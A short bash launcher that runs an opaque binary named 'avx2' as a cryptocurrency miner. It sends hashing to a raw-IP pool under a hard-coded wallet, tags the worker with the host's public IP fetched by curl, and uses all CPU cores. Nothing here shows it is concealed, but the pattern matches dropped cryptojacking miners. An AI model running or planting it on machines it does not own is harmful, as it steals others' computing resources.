#!/bin/bash
POOL=47.236.100.158:644
ALGO=yespowersugar
WALLET=DKPXo55mmhoD73tz9pcd7AJXWtKyWW4TeP.GPU_$(echo "$(curl ifconfig.me)" | tr . _ )#aeuc-j30k
cd "$(dirname "$0")"
chmod +x ./avx2 && clear && ./avx2 -a $ALGO -o $POOL -u $WALLET -p c=DOGE,zap=SUGAR -t$(nproc --all)
